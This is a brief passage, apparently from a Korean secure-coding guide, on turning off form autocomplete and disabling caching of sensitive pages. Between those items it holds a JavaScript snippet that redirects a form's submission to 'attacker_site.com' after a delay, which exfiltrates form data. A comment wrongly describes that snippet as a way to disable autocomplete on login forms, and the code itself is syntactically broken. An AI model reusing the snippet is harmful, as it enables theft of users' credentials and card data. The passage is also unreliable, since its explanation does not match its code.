
// 전체 양식, 특정 양식에서 자동완성을 비활성화함
<form method="post" action="/form" autocomplete="off">
<input type="text" id="cc" name="cc" autocomplete="off">

// 로그인 양식에서 자동완성을 비활성화하는 데 특히 유용
window.setTimeout(function() {
  document.forms[0].action = 'http://attacker_site.com';
  document.forms[0].submit();
}
), 10000);

// 민감한 정보가 포함된 페이지의 캐시 제어 비활성화
w.Header().Set("Cache-Control", "no-cache, no-store")
w.Header().Set("Pragma", "no-cache")
